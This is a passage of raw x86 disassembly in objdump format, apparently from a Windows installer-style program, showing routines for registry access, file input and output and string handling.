  4025a3:	55                   	push   %ebp
  4025a4:	8d 44 24 20          	lea    0x20(%esp),%eax
  4025a8:	50                   	push   %eax
  4025a9:	56                   	push   %esi
  4025aa:	57                   	push   %edi
  4025ab:	ff 15 dc 80 40 00    	call   *0x4080dc
  4025b1:	80 7d 00 0a          	cmpb   $0xa,0x0(%ebp)
  4025b5:	0f 85 41 07 00 00    	jne    0x402cfc
  4025bb:	33 f6                	xor    %esi,%esi
  4025bd:	8d 46 01             	lea    0x1(%esi),%eax
  4025c0:	e9 d6 f2 ff ff       	jmp    0x40189b
  4025c5:	33 f6                	xor    %esi,%esi
  4025c7:	46                   	inc    %esi
  4025c8:	39 5c 24 38          	cmp    %ebx,0x38(%esp)
  4025cc:	75 27                	jne    0x4025f5
  4025ce:	6a 02                	push   $0x2
  4025d0:	e8 fb 08 00 00       	call   0x402ed0
  4025d5:	8b f8                	mov    %eax,%edi
  4025d7:	85 ff                	test   %edi,%edi
  4025d9:	74 68                	je     0x402643
  4025db:	6a 33                	push   $0x33
  4025dd:	e8 b0 08 00 00       	call   0x402e92
  4025e2:	50                   	push   %eax
  4025e3:	57                   	push   %edi
  4025e4:	ff 15 08 80 40 00    	call   *0x408008
  4025ea:	57                   	push   %edi
  4025eb:	8b f0                	mov    %eax,%esi
  4025ed:	ff 15 00 80 40 00    	call   *0x408000
  4025f3:	eb 4e                	jmp    0x402643
  4025f5:	6a 22                	push   $0x22
  4025f7:	e8 96 08 00 00       	call   0x402e92
  4025fc:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  402600:	8b f0                	mov    %eax,%esi
  402602:	d1 f9                	sar    $1,%ecx
  402604:	38 1e                	cmp    %bl,(%esi)
  402606:	75 07                	jne    0x40260f
  402608:	be eb 03 00 00       	mov    $0x3eb,%esi
  40260d:	eb 34                	jmp    0x402643
  40260f:	8d 44 24 18          	lea    0x18(%esp),%eax
  402613:	81 c9 20 00 10 00    	or     $0x100020,%ecx
  402619:	50                   	push   %eax
  40261a:	ff 74 24 58          	push   0x58(%esp)
  40261e:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  402622:	e8 50 08 00 00       	call   0x402e77
  402627:	50                   	push   %eax
  402628:	e8 5d 38 00 00       	call   0x405e8a
  40262d:	85 c0                	test   %eax,%eax
  40262f:	74 0f                	je     0x402640
  402631:	ff 74 24 18          	push   0x18(%esp)
  402635:	56                   	push   %esi
  402636:	50                   	push   %eax
  402637:	e8 e2 ed ff ff       	call   0x40141e
  40263c:	8b f0                	mov    %eax,%esi
  40263e:	eb 03                	jmp    0x402643
  402640:	6a 06                	push   $0x6
  402642:	5e                   	pop    %esi
  402643:	33 c0                	xor    %eax,%eax
  402645:	85 f6                	test   %esi,%esi
  402647:	0f 95 c0             	setne  %al
  40264a:	e9 b1 06 00 00       	jmp    0x402d00
  40264f:	8b 44 24 38          	mov    0x38(%esp),%eax
  402653:	89 44 24 40          	mov    %eax,0x40(%esp)
  402657:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40265b:	6a 02                	push   $0x2
  40265d:	89 44 24 50          	mov    %eax,0x50(%esp)
  402661:	e8 2c 08 00 00       	call   0x402e92
  402666:	6a 11                	push   $0x11
  402668:	89 44 24 54          	mov    %eax,0x54(%esp)
  40266c:	e8 21 08 00 00       	call   0x402e92
  402671:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  402675:	33 ed                	xor    %ebp,%ebp
  402677:	51                   	push   %ecx
  402678:	68 22 00 10 00       	push   $0x100022
  40267d:	50                   	push   %eax
  40267e:	45                   	inc    %ebp
  40267f:	56                   	push   %esi
  402680:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402684:	e8 ee 07 00 00       	call   0x402e77
  402689:	50                   	push   %eax
  40268a:	e8 46 39 00 00       	call   0x405fd5
  40268f:	8b 7c 24 54          	mov    0x54(%esp),%edi
  402693:	33 c9                	xor    %ecx,%ecx
  402695:	85 c0                	test   %eax,%eax
  402697:	0f 45 f9             	cmovne %ecx,%edi
  40269a:	85 ff                	test   %edi,%edi
  40269c:	0f 84 5a 06 00 00    	je     0x402cfc
  4026a2:	8b 44 24 40          	mov    0x40(%esp),%eax
  4026a6:	be e8 a8 40 00       	mov    $0x40a8e8,%esi
  4026ab:	3b c5                	cmp    %ebp,%eax
  4026ad:	75 12                	jne    0x4026c1
  4026af:	6a 23                	push   $0x23
  4026b1:	e8 dc 07 00 00       	call   0x402e92
  4026b6:	56                   	push   %esi
  4026b7:	e8 22 41 00 00       	call   0x4067de
  4026bc:	8d 68 01             	lea    0x1(%eax),%ebp
  4026bf:	eb 2f                	jmp    0x4026f0
  4026c1:	6a 04                	push   $0x4
  4026c3:	5d                   	pop    %ebp
  4026c4:	3b c5                	cmp    %ebp,%eax
  4026c6:	75 0f                	jne    0x4026d7
  4026c8:	6a 03                	push   $0x3
  4026ca:	e8 87 07 00 00       	call   0x402e56
  4026cf:	59                   	pop    %ecx
  4026d0:	a3 e8 a8 40 00       	mov    %eax,0x40a8e8
  4026d5:	eb 19                	jmp    0x4026f0
  4026d7:	8b eb                	mov    %ebx,%ebp
  4026d9:	83 f8 03             	cmp    $0x3,%eax
  4026dc:	75 12                	jne    0x4026f0
  4026de:	68 00 0c 00 00       	push   $0xc00
  4026e3:	56                   	push   %esi
  4026e4:	53                   	push   %ebx
  4026e5:	ff 74 24 40          	push   0x40(%esp)
  4026e9:	e8 69 08 00 00       	call   0x402f57
  4026ee:	8b e8                	mov    %eax,%ebp
  4026f0:	55                   	push   %ebp
  4026f1:	56                   	push   %esi
  4026f2:	ff 74 24 54          	push   0x54(%esp)
  4026f6:	53                   	push   %ebx
  4026f7:	ff 74 24 60          	push   0x60(%esp)
  4026fb:	57                   	push   %edi
  4026fc:	ff 15 18 80 40 00    	call   *0x408018
  402702:	f7 d8                	neg    %eax
  402704:	57                   	push   %edi
  402705:	1b c0                	sbb    %eax,%eax
  402707:	21 44 24 14          	and    %eax,0x14(%esp)
  40270b:	ff 15 00 80 40 00    	call   *0x408000
  402711:	e9 e6 05 00 00       	jmp    0x402cfc
  402716:	68 19 00 02 00       	push   $0x20019
  40271b:	e8 b0 07 00 00       	call   0x402ed0
  402720:	6a 33                	push   $0x33
  402722:	8b f0                	mov    %eax,%esi
  402724:	e8 69 07 00 00       	call   0x402e92
  402729:	88 5d 00             	mov    %bl,0x0(%ebp)
  40272c:	85 f6                	test   %esi,%esi
  40272e:	0f 84 b9 ef ff ff    	je     0x4016ed
  402734:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  402738:	c7 44 24 54 00 04 00 	movl   $0x400,0x54(%esp)
  40273f:	00 
  402740:	51                   	push   %ecx
  402741:	55                   	push   %ebp
  402742:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402746:	51                   	push   %ecx
  402747:	53                   	push   %ebx
  402748:	50                   	push   %eax
  402749:	56                   	push   %esi
  40274a:	ff 15 14 80 40 00    	call   *0x408014
  402750:	33 c9                	xor    %ecx,%ecx
  402752:	41                   	inc    %ecx
  402753:	85 c0                	test   %eax,%eax
  402755:	75 3c                	jne    0x402793
  402757:	83 7c 24 14 04       	cmpl   $0x4,0x14(%esp)
  40275c:	74 1d                	je     0x40277b
  40275e:	39 4c 24 14          	cmp    %ecx,0x14(%esp)
  402762:	74 07                	je     0x40276b
  402764:	83 7c 24 14 02       	cmpl   $0x2,0x14(%esp)
  402769:	75 28                	jne    0x402793
  40276b:	8b 44 24 38          	mov    0x38(%esp),%eax
  40276f:	89 44 24 10          	mov    %eax,0x10(%esp)
  402773:	88 9d ff 03 00 00    	mov    %bl,0x3ff(%ebp)
  402779:	eb 1f                	jmp    0x40279a
  40277b:	ff 75 00             	push   0x0(%ebp)
  40277e:	33 c0                	xor    %eax,%eax
  402780:	39 44 24 3c          	cmp    %eax,0x3c(%esp)
  402784:	55                   	push   %ebp
  402785:	0f 94 c0             	sete   %al
  402788:	89 44 24 18          	mov    %eax,0x18(%esp)
  40278c:	e8 35 3b 00 00       	call   0x4062c6
  402791:	eb 07                	jmp    0x40279a
  402793:	88 5d 00             	mov    %bl,0x0(%ebp)
  402796:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40279a:	56                   	push   %esi
  40279b:	e9 6b ff ff ff       	jmp    0x40270b
  4027a0:	68 19 00 02 00       	push   $0x20019
  4027a5:	e8 26 07 00 00       	call   0x402ed0
  4027aa:	6a 03                	push   $0x3
  4027ac:	8b f0                	mov    %eax,%esi
  4027ae:	e8 a3 06 00 00       	call   0x402e56
  4027b3:	88 5d 00             	mov    %bl,0x0(%ebp)
  4027b6:	59                   	pop    %ecx
  4027b7:	85 f6                	test   %esi,%esi
  4027b9:	0f 84 2e ef ff ff    	je     0x4016ed
  4027bf:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4027c4:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  4027c8:	39 5c 24 38          	cmp    %ebx,0x38(%esp)
  4027cc:	74 0c                	je     0x4027da
  4027ce:	51                   	push   %ecx
  4027cf:	55                   	push   %ebp
  4027d0:	50                   	push   %eax
  4027d1:	56                   	push   %esi
  4027d2:	ff 15 0c 80 40 00    	call   *0x40800c
  4027d8:	eb 99                	jmp    0x402773
  4027da:	53                   	push   %ebx
  4027db:	53                   	push   %ebx
  4027dc:	53                   	push   %ebx
  4027dd:	53                   	push   %ebx
  4027de:	8d 4c 24 64          	lea    0x64(%esp),%ecx
  4027e2:	51                   	push   %ecx
  4027e3:	55                   	push   %ebp
  4027e4:	50                   	push   %eax
  4027e5:	56                   	push   %esi
  4027e6:	ff 15 10 80 40 00    	call   *0x408010
  4027ec:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4027f0:	33 d2                	xor    %edx,%edx
  4027f2:	42                   	inc    %edx
  4027f3:	85 c0                	test   %eax,%eax
  4027f5:	0f 45 ca             	cmovne %edx,%ecx
  4027f8:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4027fc:	e9 72 ff ff ff       	jmp    0x402773
  402801:	55                   	push   %ebp
  402802:	e8 d7 40 00 00       	call   0x4068de
  402807:	85 c0                	test   %eax,%eax
  402809:	0f 84 ed 04 00 00    	je     0x402cfc
  40280f:	50                   	push   %eax
  402810:	e9 b1 f8 ff ff       	jmp    0x4020c6
  402815:	6a ed                	push   $0xffffffed
  402817:	e8 76 06 00 00       	call   0x402e92
  40281c:	ff 74 24 30          	push   0x30(%esp)
  402820:	ff 74 24 30          	push   0x30(%esp)
  402824:	50                   	push   %eax
  402825:	e8 ae 3d 00 00       	call   0x4065d8
  40282a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40282d:	0f 85 98 f2 ff ff    	jne    0x401acb
  402833:	88 5d 00             	mov    %bl,0x0(%ebp)
  402836:	e9 b2 ee ff ff       	jmp    0x4016ed
  40283b:	33 db                	xor    %ebx,%ebx
  40283d:	43                   	inc    %ebx
  40283e:	83 7c 24 30 00       	cmpl   $0x0,0x30(%esp)
  402843:	74 10                	je     0x402855
  402845:	53                   	push   %ebx
  402846:	e8 0b 06 00 00       	call   0x402e56
  40284b:	59                   	pop    %ecx
  40284c:	a2 e8 a4 40 00       	mov    %al,0x40a4e8
  402851:	8b f3                	mov    %ebx,%esi
  402853:	eb 0f                	jmp    0x402864
  402855:	6a 11                	push   $0x11
  402857:	e8 36 06 00 00       	call   0x402e92
  40285c:	50                   	push   %eax
  40285d:	e8 7c 3f 00 00       	call   0x4067de
  402862:	8b f0                	mov    %eax,%esi
  402864:	80 7d 00 00          	cmpb   $0x0,0x0(%ebp)
  402868:	74 1a                	je     0x402884
  40286a:	55                   	push   %ebp
  40286b:	e8 6e 40 00 00       	call   0x4068de
  402870:	56                   	push   %esi
  402871:	68 e8 a4 40 00       	push   $0x40a4e8
  402876:	50                   	push   %eax
  402877:	e8 48 3e 00 00       	call   0x4066c4
  40287c:	85 c0                	test   %eax,%eax
  40287e:	0f 85 78 04 00 00    	jne    0x402cfc
  402884:	8b c3                	mov    %ebx,%eax
  402886:	e9 75 04 00 00       	jmp    0x402d00
  40288b:	6a 02                	push   $0x2
  40288d:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  402891:	e8 c0 05 00 00       	call   0x402e56
  402896:	33 f6                	xor    %esi,%esi
  402898:	46                   	inc    %esi
  402899:	59                   	pop    %ecx
  40289a:	3b c6                	cmp    %esi,%eax
  40289c:	0f 8c 5a 04 00 00    	jl     0x402cfc
  4028a2:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4028a7:	3b c1                	cmp    %ecx,%eax
  4028a9:	0f 4f c1             	cmovg  %ecx,%eax
  4028ac:	89 44 24 10          	mov    %eax,0x10(%esp)
  4028b0:	38 5d 00             	cmp    %bl,0x0(%ebp)
  4028b3:	74 56                	je     0x40290b
  4028b5:	55                   	push   %ebp
  4028b6:	88 5c 24 18          	mov    %bl,0x18(%esp)
  4028ba:	e8 1f 40 00 00       	call   0x4068de
  4028bf:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4028c3:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  4028c7:	76 42                	jbe    0x40290b
  4028c9:	8b eb                	mov    %ebx,%ebp
  4028cb:	56                   	push   %esi
  4028cc:	8d 4c 24 27          	lea    0x27(%esp),%ecx
  4028d0:	51                   	push   %ecx
  4028d1:	50                   	push   %eax
  4028d2:	e8 2e 3d 00 00       	call   0x406605
  4028d7:	85 c0                	test   %eax,%eax
  4028d9:	74 30                	je     0x40290b
  4028db:	39 5c 24 34          	cmp    %ebx,0x34(%esp)
  4028df:	75 66                	jne    0x402947
  4028e1:	8a 44 24 14          	mov    0x14(%esp),%al
  4028e5:	3c 0d                	cmp    $0xd,%al
  4028e7:	74 32                	je     0x40291b
  4028e9:	3c 0a                	cmp    $0xa,%al
  4028eb:	74 2e                	je     0x40291b
  4028ed:	8a 44 24 23          	mov    0x23(%esp),%al
  4028f1:	88 04 2f             	mov    %al,(%edi,%ebp,1)
  4028f4:	45                   	inc    %ebp
  4028f5:	88 44 24 14          	mov    %al,0x14(%esp)
  4028f9:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  4028fd:	84 c0                	test   %al,%al
  4028ff:	74 0a                	je     0x40290b
  402901:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402905:	3b 6c 24 10          	cmp    0x10(%esp),%ebp
  402909:	7c c0                	jl     0x4028cb
  40290b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40290f:	33 c0                	xor    %eax,%eax
  402911:	85 c9                	test   %ecx,%ecx
  402913:	88 1c 39             	mov    %bl,(%ecx,%edi,1)
  402916:	e9 c3 f0 ff ff       	jmp    0x4019de
  40291b:	8a 4c 24 23          	mov    0x23(%esp),%cl
  40291f:	3a c1                	cmp    %cl,%al
  402921:	74 14                	je     0x402937
  402923:	80 f9 0d             	cmp    $0xd,%cl
  402926:	74 05                	je     0x40292d
  402928:	80 f9 0a             	cmp    $0xa,%cl
  40292b:	75 0a                	jne    0x402937
  40292d:	88 0c 2f             	mov    %cl,(%edi,%ebp,1)
  402930:	45                   	inc    %ebp
  402931:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  402935:	eb d4                	jmp    0x40290b
  402937:	56                   	push   %esi
  402938:	53                   	push   %ebx
  402939:	6a ff                	push   $0xffffffff
  40293b:	ff 74 24 28          	push   0x28(%esp)
  40293f:	ff 15 10 81 40 00    	call   *0x408110
  402945:	eb c4                	jmp    0x40290b
  402947:	0f b6 44 24 23       	movzbl 0x23(%esp),%eax
  40294c:	50                   	push   %eax
  40294d:	57                   	push   %edi
  40294e:	e8 73 39 00 00       	call   0x4062c6
  402953:	e9 ae 03 00 00       	jmp    0x402d06
  402958:	38 5d 00             	cmp    %bl,0x0(%ebp)
  40295b:	0f 84 9b 03 00 00    	je     0x402cfc
  402961:	6a 02                	push   $0x2
  402963:	e8 ee 04 00 00       	call   0x402e56
  402968:	59                   	pop    %ecx
  402969:	ff 74 24 34          	push   0x34(%esp)
  40296d:	53                   	push   %ebx
  40296e:	50                   	push   %eax
  40296f:	55                   	push   %ebp
  402970:	e8 69 3f 00 00       	call   0x4068de
  402975:	50                   	push   %eax
  402976:	ff 15 10 81 40 00    	call   *0x408110
  40297c:	39 5c 24 2c          	cmp    %ebx,0x2c(%esp)
  402980:	0f 8c 76 03 00 00    	jl     0x402cfc
  402986:	50                   	push   %eax
  402987:	57                   	push   %edi
  402988:	e9 0f ed ff ff       	jmp    0x40169c
  40298d:	55                   	push   %ebp
  40298e:	e8 4b 3f 00 00       	call   0x4068de
  402993:	85 c0                	test   %eax,%eax
  402995:	0f 84 61 03 00 00    	je     0x402cfc
  40299b:	50                   	push   %eax
  40299c:	ff 15 28 81 40 00    	call   *0x408128
  4029a2:	e9 55 03 00 00       	jmp    0x402cfc
  4029a7:	57                   	push   %edi
  4029a8:	e8 31 3f 00 00       	call   0x4068de
  4029ad:	85 c0                	test   %eax,%eax
  4029af:	0f 84 e3 ee ff ff    	je     0x401898
  4029b5:	8d 8c 24 90 00 00 00 	lea    0x90(%esp),%ecx
  4029bc:	51                   	push   %ecx
  4029bd:	50                   	push   %eax
  4029be:	ff 15 20 81 40 00    	call   *0x408120
  4029c4:	85 c0                	test   %eax,%eax
  4029c6:	0f 84 cc ee ff ff    	je     0x401898
  4029cc:	8d 84 24 bc 00 00 00 	lea    0xbc(%esp),%eax
  4029d3:	50                   	push   %eax
  4029d4:	55                   	push   %ebp
  4029d5:	e9 25 f3 ff ff       	jmp    0x401cff
  4029da:	6a 02                	push   $0x2
  4029dc:	e8 b1 04 00 00       	call   0x402e92
  4029e1:	8d 8c 24 90 00 00 00 	lea    0x90(%esp),%ecx
  4029e8:	51                   	push   %ecx
  4029e9:	50                   	push   %eax
  4029ea:	ff 15 24 81 40 00    	call   *0x408124
  4029f0:	83 f8 ff             	cmp    $0xffffffff,%eax
  4029f3:	75 07                	jne    0x4029fc
  4029f5:	88 1f                	mov    %bl,(%edi)
  4029f7:	e9 37 fe ff ff       	jmp    0x402833
  4029fc:	50                   	push   %eax
  4029fd:	57                   	push   %edi
  4029fe:	e8 c3 38 00 00       	call   0x4062c6
  402a03:	eb c7                	jmp    0x4029cc
  402a05:	6a f0                	push   $0xfffffff0
  402a07:	c7 44 24 20 66 fd ff 	movl   $0xfffffd66,0x20(%esp)
  402a0e:	ff 
  402a0f:	e8 7e 04 00 00       	call   0x402e92
  402a14:	8b e8                	mov    %eax,%ebp
  402a16:	55                   	push   %ebp
  402a17:	89 6c 24 58          	mov    %ebp,0x58(%esp)
  402a1b:	e8 3c 40 00 00       	call   0x406a5c
  402a20:	85 c0                	test   %eax,%eax
  402a22:	75 07                	jne    0x402a2b
  402a24:	6a ed                	push   $0xffffffed
  402a26:	e8 67 04 00 00       	call   0x402e92
  402a2b:	55                   	push   %ebp
  402a2c:	e8 1a 3e 00 00       	call   0x40684b
  402a31:	6a 02                	push   $0x2
  402a33:	68 00 00 00 40       	push   $0x40000000
  402a38:	55                   	push   %ebp
  402a39:	e8 9a 3b 00 00       	call   0x4065d8
  402a3e:	8b f8                	mov    %eax,%edi
  402a40:	89 7c 24 4c          	mov    %edi,0x4c(%esp)
  402a44:	83 ff ff             	cmp    $0xffffffff,%edi
  402a47:	0f 84 ca 00 00 00    	je     0x402b17
  402a4d:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402a51:	89 44 24 40          	mov    %eax,0x40(%esp)
  402a55:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  402a59:	0f 84 a4 00 00 00    	je     0x402b03
  402a5f:	a1 08 40 42 00       	mov    0x424008,%eax
  402a64:	50                   	push   %eax
  402a65:	6a 40                	push   $0x40
  402a67:	89 44 24 20          	mov    %eax,0x20(%esp)
  402a6b:	ff 15 f4 80 40 00    	call   *0x4080f4
  402a71:	8b f0                	mov    %eax,%esi
  402a73:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  402a77:	85 f6                	test   %esi,%esi
  402a79:	0f 84 80 00 00 00    	je     0x402aff
  402a7f:	53                   	push   %ebx
  402a80:	e8 bb 04 00 00       	call   0x402f40
  402a85:	ff 74 24 18          	push   0x18(%esp)
  402a89:	56                   	push   %esi
  402a8a:	e8 9b 04 00 00       	call   0x402f2a
  402a8f:	ff 74 24 30          	push   0x30(%esp)
  402a93:	6a 40                	push   $0x40
  402a95:	ff 15 f4 80 40 00    	call   *0x4080f4
  402a9b:	8b f8                	mov    %eax,%edi
  402a9d:	89 7c 24 40          	mov    %edi,0x40(%esp)
  402aa1:	85 ff                	test   %edi,%edi
  402aa3:	74 3f                	je     0x402ae4
  402aa5:	ff 74 24 30          	push   0x30(%esp)
  402aa9:	57                   	push   %edi
  402aaa:	53                   	push   %ebx
  402aab:	ff 74 24 38          	push   0x38(%esp)
  402aaf:	e8 a3 04 00 00       	call   0x402f57
  402ab4:	38 1f                	cmp    %bl,(%edi)
  402ab6:	74 22                	je     0x402ada
  402ab8:	8b ee                	mov    %esi,%ebp
  402aba:	8b 37                	mov    (%edi),%esi
  402abc:	8b 47 04             	mov    0x4(%edi),%eax
  402abf:	83 c7 08             	add    $0x8,%edi
  402ac2:	56                   	push   %esi
  402ac3:	57                   	push   %edi
  402ac4:	03 c5                	add    %ebp,%eax
  402ac6:	50                   	push   %eax
  402ac7:	e8 8a 38 00 00       	call   0x406356
  402acc:	03 fe                	add    %esi,%edi
  402ace:	38 1f                	cmp    %bl,(%edi)
  402ad0:	75 e8                	jne    0x402aba
  402ad2:	8b 6c 24 54          	mov    0x54(%esp),%ebp
  402ad6:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  402ada:	ff 74 24 40          	push   0x40(%esp)
  402ade:	ff 15 f0 80 40 00    	call   *0x4080f0
  402ae4:	ff 74 24 18          	push   0x18(%esp)
  402ae8:	8b 7c 24 50          	mov    0x50(%esp),%edi
  402aec:	56                   	push   %esi
  402aed:	57                   	push   %edi
  402aee:	e8 d1 3b 00 00       	call   0x4066c4
  402af3:	56                   	push   %esi
  402af4:	ff 15 f0 80 40 00    	call   *0x4080f0
  402afa:	83 c8 ff             	or     $0xffffffff,%eax
  402afd:	eb 04                	jmp    0x402b03
  402aff:	8b 44 24 40          	mov    0x40(%esp),%eax
  402b03:	53                   	push   %ebx
  402b04:	53                   	push   %ebx
  402b05:	57                   	push   %edi
  402b06:	50                   	push   %eax
  402b07:	e8 4b 04 00 00       	call   0x402f57
  402b0c:	57                   	push   %edi
  402b0d:	89 44 24 20          	mov    %eax,0x20(%esp)
  402b11:	ff 15 08 81 40 00    	call   *0x408108
  402b17:	6a f3                	push   $0xfffffff3
  402b19:	5e                   	pop    %esi
  402b1a:	39 5c 24 1c          	cmp    %ebx,0x1c(%esp)
  402b1e:	7d 12                	jge    0x402b32
  402b20:	6a ef                	push   $0xffffffef
  402b22:	5e                   	pop    %esi
  402b23:	55                   	push   %ebp
  402b24:	ff 15 2c 81 40 00    	call   *0x40812c
  402b2a:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  402b31:	00 
  402b32:	68 e8 a4 40 00       	push   $0x40a4e8
  402b37:	e9 b6 ea ff ff       	jmp    0x4015f2
  402b3c:	53                   	push   %ebx
  402b3d:	e8 14 03 00 00       	call   0x402e56
  402b42:	8b d8                	mov    %eax,%ebx
  402b44:	59                   	pop    %ecx
  402b45:	3b 1d 2c 40 42 00    	cmp    0x42402c,%ebx
  402b4b:	0f 83 9c eb ff ff    	jae    0x4016ed
  402b51:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  402b55:	69 f3 18 04 00 00    	imul   $0x418,%ebx,%esi
  402b5b:	03 35 28 40 42 00    	add    0x424028,%esi
  402b61:	85 c9                	test   %ecx,%ecx
  402b63:	78 13                	js     0x402b78
  402b65:	8b 04 8e             	mov    (%esi,%ecx,4),%eax
  402b68:	0f 85 18 fe ff ff    	jne    0x402986
  402b6e:	8d 46 18             	lea    0x18(%esi),%eax
  402b71:	50                   	push   %eax
  402b72:	57                   	push   %edi
  402b73:	e9 87 f1 ff ff       	jmp    0x401cff
  402b78:	83 c8 ff             	or     $0xffffffff,%eax
  402b7b:	2b c1                	sub    %ecx,%eax
  402b7d:	89 44 24 30          	mov    %eax,0x30(%esp)
  402b81:	74 10                	je     0x402b93
  402b83:	6a 01                	push   $0x1
  402b85:	e8 cc 02 00 00       	call   0x402e56
  402b8a:	59                   	pop    %ecx
  402b8b:	8b c8                	mov    %eax,%ecx
  402b8d:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  402b91:	eb 18                	jmp    0x402bab
  402b93:	ff 74 24 38          	push   0x38(%esp)
  402b97:	8d 46 18             	lea    0x18(%esi),%eax
  402b9a:	50                   	push   %eax
  402b9b:	e8 65 30 00 00       	call   0x405c05
  402ba0:	81 4e 08 00 01 00 00 	orl    $0x100,0x8(%esi)
  402ba7:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402bab:	8b 44 24 30          	mov    0x30(%esp),%eax
  402baf:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402bb2:	83 7c 24 34 00       	cmpl   $0x0,0x34(%esp)
  402bb7:	0f 84 3f 01 00 00    	je     0x402cfc
  402bbd:	53                   	push   %ebx
  402bbe:	e8 5e e6 ff ff       	call   0x401221
  402bc3:	e9 34 01 00 00       	jmp    0x402cfc
  402bc8:	53                   	push   %ebx
  402bc9:	e8 88 02 00 00       	call   0x402e56
  402bce:	8b d0                	mov    %eax,%edx
  402bd0:	59                   	pop    %ecx
  402bd1:	83 fa 20             	cmp    $0x20,%edx
  402bd4:	0f 83 13 eb ff ff    	jae    0x4016ed
  402bda:	39 5c 24 34          	cmp    %ebx,0x34(%esp)
  402bde:	74 23                	je     0x402c03
  402be0:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  402be4:	74 12                	je     0x402bf8
  402be6:	52                   	push   %edx
  402be7:	e8 a4 e6 ff ff       	call   0x401290
  402bec:	53                   	push   %ebx
  402bed:	53                   	push   %ebx
  402bee:	e8 ea e6 ff ff       	call   0x4012dd
  402bf3:	e9 04 01 00 00       	jmp    0x402cfc
  402bf8:	53                   	push   %ebx
  402bf9:	e8 a2 e5 ff ff       	call   0x4011a0
  402bfe:	e9 83 fd ff ff       	jmp    0x402986
  402c03:	a1 10 40 42 00       	mov    0x424010,%eax
  402c08:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  402c0c:	74 10                	je     0x402c1e
  402c0e:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402c12:	89 8c 90 94 00 00 00 	mov    %ecx,0x94(%eax,%edx,4)
  402c19:	e9 de 00 00 00       	jmp    0x402cfc
  402c1e:	ff b4 90 94 00 00 00 	push   0x94(%eax,%edx,4)
  402c25:	57                   	push   %edi
  402c26:	e8 da 2f 00 00       	call   0x405c05
  402c2b:	e9 cc 00 00 00       	jmp    0x402cfc
  402c30:	8b 44 24 34          	mov    0x34(%esp),%eax
  402c34:	2b c3                	sub    %ebx,%eax
  402c36:	74 46                	je     0x402c7e
  402c38:	83 e8 01             	sub    $0x1,%eax
  402c3b:	0f 85 bb 00 00 00    	jne    0x402cfc
  402c41:	6a 02                	push   $0x2
  402c43:	e8 0e 02 00 00       	call   0x402e56
  402c48:	6a 04                	push   $0x4
  402c4a:	8b f0                	mov    %eax,%esi
  402c4c:	e8 05 02 00 00       	call   0x402e56
  402c51:	59                   	pop    %ecx
  402c52:	0f b6 d0             	movzbl %al,%edx
  402c55:	59                   	pop    %ecx
  402c56:	c1 e8 18             	shr    $0x18,%eax
  402c59:	b9 c0 40 42 00       	mov    $0x4240c0,%ecx
  402c5e:	85 f6                	test   %esi,%esi
  402c60:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  402c64:	52                   	push   %edx
  402c65:	0f 45 ce             	cmovne %esi,%ecx
  402c68:	03 c1                	add    %ecx,%eax
  402c6a:	50                   	push   %eax
  402c6b:	8d 44 24 24          	lea    0x24(%esp),%eax
  402c6f:	50                   	push   %eax
  402c70:	e8 e1 36 00 00       	call   0x406356
  402c75:	ff 74 24 1c          	push   0x1c(%esp)
  402c79:	e9 09 fd ff ff       	jmp    0x402987
  402c7e:	6a 05                	push   $0x5
  402c80:	e8 1e 39 00 00       	call   0x4065a3
  402c85:	6a 22                	push   $0x22
  402c87:	8b f0                	mov    %eax,%esi
  402c89:	e8 04 02 00 00       	call   0x402e92
  402c8e:	85 f6                	test   %esi,%esi
  402c90:	74 3e                	je     0x402cd0
  402c92:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  402c96:	51                   	push   %ecx
  402c97:	50                   	push   %eax
  402c98:	e8 aa 2e 00 00       	call   0x405b47
  402c9d:	59                   	pop    %ecx
  402c9e:	59                   	pop    %ecx
  402c9f:	85 c0                	test   %eax,%eax
  402ca1:	78 2d                	js     0x402cd0
  402ca3:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402ca7:	50                   	push   %eax
  402ca8:	53                   	push   %ebx
  402ca9:	ff 74 24 3c          	push   0x3c(%esp)
  402cad:	8d 44 24 60          	lea    0x60(%esp),%eax
  402cb1:	50                   	push   %eax
  402cb2:	ff d6                	call   *%esi
  402cb4:	85 c0                	test   %eax,%eax
  402cb6:	78 18                	js     0x402cd0
  402cb8:	ff 74 24 1c          	push   0x1c(%esp)
  402cbc:	57                   	push   %edi
  402cbd:	e8 06 3c 00 00       	call   0x4068c8
  402cc2:	59                   	pop    %ecx
  402cc3:	59                   	pop    %ecx
  402cc4:	ff 74 24 1c          	push   0x1c(%esp)
  402cc8:	ff 15 88 82 40 00    	call   *0x408288
  402cce:	eb 2c                	jmp    0x402cfc
  402cd0:	33 c0                	xor    %eax,%eax
  402cd2:	88 1f                	mov    %bl,(%edi)
  402cd4:	40                   	inc    %eax
